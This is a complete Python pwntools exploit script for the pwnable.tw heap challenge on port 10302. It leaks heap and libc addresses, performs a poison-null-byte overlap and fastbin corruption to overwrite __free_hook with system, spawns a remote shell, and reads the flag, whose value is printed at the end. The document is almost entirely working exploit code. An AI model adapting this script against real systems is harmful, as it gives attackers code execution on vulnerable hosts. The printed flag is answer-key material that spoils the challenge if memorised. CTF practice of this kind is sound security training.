#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10302)
#r = remote('127.0.0.1', 7122)
lib = ELF('./libc.so.6')
#lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'

def add(sz, name, secret):
	r.sendafter('choice :', '1\n')
	r.sendafter('Size of heart :', '%d\n' % sz)
	r.sendafter('Name of heart :', name)
	r.sendafter('secret of my heart :', secret)

def show(idx):
	r.sendafter('choice :', '2\n')
	r.sendafter('Index :', '%d\n' % idx)
	return r.recvuntil('======', drop=True)

def dele(idx):
	r.sendafter('choice :', '3\n')
	r.sendafter('Index :', '%d\n' % idx)

def secret():
	r.sendafter('choice :', '4869\n')


# leak heap
add(24, 'A'*32, 'A')
x = show(0)
x = x.split('\n')[2][39:]
heap = u64(x.ljust(8, '\0'))-0x10
print 'heap:', hex(heap)
dele(0)

# poison null byte
# https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c
add(256, 'A'*32, flat(
	[0]*30,
	0x100, 0x100,
))
add(256, 'A'*32, 'A')
dele(0)
add(24, 'A'*32, 'A'*24)		# overflow null byte
add(128, 'A'*32, 'A')
add(72, 'A'*32, 'A')
dele(2)
dele(1)

# leak libc
add(128, 'A'*32, 'B'*127)
add(128, 'A'*32, 'C'*127)	# 2 == 3
add(128, 'A'*32, 'D'*127)
dele(3)
x = show(2)			# 2 is the idx
x = x.split('\n')[3][9:]
main_arena = u64(x.ljust(8, '\0'))-0x58
#libc = main_arena-0x3c4b20		# local
libc = main_arena-0x3c4b20+0x1000	# remote
print 'main_arena:', hex(main_arena)
print 'libc_base:', hex(libc)
dele(4)

# fastbin corruption
__malloc_hook = libc + lib.symbols['__malloc_hook']
__free_hook = libc + lib.symbols['__free_hook']
magic = libc + 0x4526a
print '__malloc_hook:', hex(__malloc_hook)
print '__free_hook:', hex(__free_hook)
print 'magic:', hex(magic)
add(100, 'B', '\xaa'*100)
add(100, 'B', '\xbb'*100)
dele(3)
dele(4)
dele(2)				# 2 == 3
add(100, 'C', flat(__malloc_hook-0x28+5))
add(100, 'C', 'C')
add(100, 'C', 'C')
# malloc on main_arena
add(100, 'C', flat(
	'pad', [0]*7,
	0x5f, main_arena+0x10,
	0x7f, main_arena+0x20,
))
# overwrite topchunk
first = __free_hook-0x1098+5
second = first+3+0x10
print 'first:', hex(first)
print 'second:', hex(second)
add(100, 'D', flat(
	first,
	[0]*4,
	second,
))
# malloc on first to fake topchunk size
add(100, 'E', flat(
	'pad', 0,
	0x20e31,
))
# malloc from second until free hook
system = libc + lib.symbols['system']
print 'system:', hex(system)
for i in range(15):
	add(256, 'F', '\n')
# free = system
add(256, '\xff'*32, flat('sh'+'\x00'*6, [0]*15, system))
# system("sh")
dele(23)


r.sendline('cat /home/`whoami`/flag')
r.interactive()

# FLAG{It_just_4_s3cr3t_on_the_h34p}
